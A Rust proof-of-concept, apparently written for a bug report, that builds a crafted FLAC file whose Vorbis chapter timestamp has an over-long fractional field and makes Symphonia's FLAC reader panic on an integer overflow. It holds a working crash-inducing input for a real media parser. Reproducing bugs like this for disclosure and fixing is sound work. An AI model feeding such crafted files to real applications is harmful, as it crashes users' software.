//! Standalone, end-to-end reproduction of the pow() overflow in
//! `symphonia_metadata::embedded::vorbis::parse_chapter_timestamp`.
//!
//! This builds a real, otherwise-valid, minimal FLAC file containing a `VORBIS_COMMENT`
//! metadata block with a crafted `CHAPTER001=...` comment whose fractional-seconds field has
//! 20 digits (only trailing zeros are trimmed, so leading zeros still count towards
//! `frac_s_digits`). It then feeds that file through the real, public
//! `symphonia_bundle_flac::FlacReader::try_new` entry point - the same one any real
//! application (e.g. symphonia-play) uses to open a `.flac` file - to show that a real FLAC
//! demuxer, driven only by file bytes, panics on `10u64.pow(20)` overflowing.

use std::io::Cursor;

use symphonia_bundle_flac::FlacReader;
use symphonia_core::formats::FormatOptions;
use symphonia_core::io::{MediaSourceStream, MediaSourceStreamOptions};

/// Build a minimal, otherwise well-formed FLAC file with a single STREAMINFO block followed by
/// a VORBIS_COMMENT block containing a malicious CHAPTER001 timestamp comment.
fn build_malicious_flac(frac_digits: usize) -> Vec<u8> {
    let mut file = Vec::new();
    file.extend_from_slice(b"fLaC");

    // --- STREAMINFO block (mandatory, type 0, not last) ---
    let stream_info_body: [u8; 34] = [
        0x10, 0x00, // min block size = 4096
        0x10, 0x00, // max block size = 4096
        0x00, 0x00, 0x00, // min frame size = 0 (unknown)
        0x00, 0x00, 0x00, // max frame size = 0 (unknown)
        // Packed 64 bits: sample_rate(20)=44100, channels-1(3)=1, bits_per_sample-1(5)=15,
        // n_samples(36)=0.
        0x0a, 0xc4, 0x42, 0xf0, 0x00, 0x00, 0x00, 0x00,
        // MD5 (all zero = "not present")
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    ];
    file.push(0x00); // type = STREAMINFO(0), is_last = false
    file.extend_from_slice(&(stream_info_body.len() as u32).to_be_bytes()[1..]); // 24-bit BE len
    file.extend_from_slice(&stream_info_body);

    // --- VORBIS_COMMENT block (type 4, last block) ---
    let mut comment_block = Vec::new();

    let vendor = b"repro";
    comment_block.extend_from_slice(&(vendor.len() as u32).to_le_bytes());
    comment_block.extend_from_slice(vendor);

    // A fractional-seconds string that is all zeros except for a trailing '1', so
    // `trim_end_matches('0')` in `parse_unsigned_num` does not shrink it at all. All of its
    // partial products during parsing stay 0 or 1, so `checked_mul`/`checked_add` never
    // triggers - but `frac_s_digits` (its full length) is `frac_digits`, and
    // `10u64.pow(frac_s_digits)` overflows once `frac_s_digits > 19`.
    let frac = format!("{}1", "0".repeat(frac_digits - 1));
    let comment_str = format!("CHAPTER001={:02}:{:02}:{:02}.{}", 0, 0, 0, frac);
    let comment_bytes = comment_str.as_bytes();

    comment_block.extend_from_slice(&1u32.to_le_bytes()); // num_comments = 1
    comment_block.extend_from_slice(&(comment_bytes.len() as u32).to_le_bytes());
    comment_block.extend_from_slice(comment_bytes);

    file.push(0x84); // type = VORBIS_COMMENT(4), is_last = true
    file.extend_from_slice(&(comment_block.len() as u32).to_be_bytes()[1..]); // 24-bit BE len
    file.extend_from_slice(&comment_block);

    file
}

fn try_open(frac_digits: usize) {
    let bytes = build_malicious_flac(frac_digits);
    let mss = MediaSourceStream::new(Box::new(Cursor::new(bytes)), MediaSourceStreamOptions::default());

    println!("Opening crafted FLAC file with CHAPTER timestamp frac_s_digits={frac_digits} ...");
    match FlacReader::try_new(mss, FormatOptions::default()) {
        Ok(_) => println!("  -> opened without error (no panic, no crash)"),
        Err(e) => println!("  -> returned Err (no panic, no crash): {e}"),
    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let frac_digits: usize = args.get(1).and_then(|s| s.parse().ok()).unwrap_or(20);
    try_open(frac_digits);
}
